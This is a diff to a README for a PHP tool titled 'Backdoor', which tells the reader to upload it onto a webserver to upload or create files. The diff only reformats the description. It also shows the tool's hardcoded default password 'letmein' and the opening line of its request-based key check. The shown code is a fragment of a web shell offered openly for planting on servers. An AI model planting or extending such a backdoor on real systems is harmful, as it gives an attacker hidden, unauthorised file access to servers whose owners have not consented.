@@ -1,7 +1,7 @@
 Backdoor
 ========
 
-Upload onto a webserver to upload or create files.  Just change the $key (password) to what you want.  For the example it's set as "letmein".
+Upload onto a webserver to upload or create files.  Just change the *$key* (aka password) to what you want.  For the example it's set as "letmein".
 
 ```php
 $key = $_REQUEST['key'] == 'letmein' ? $_REQUEST['key'] : false;
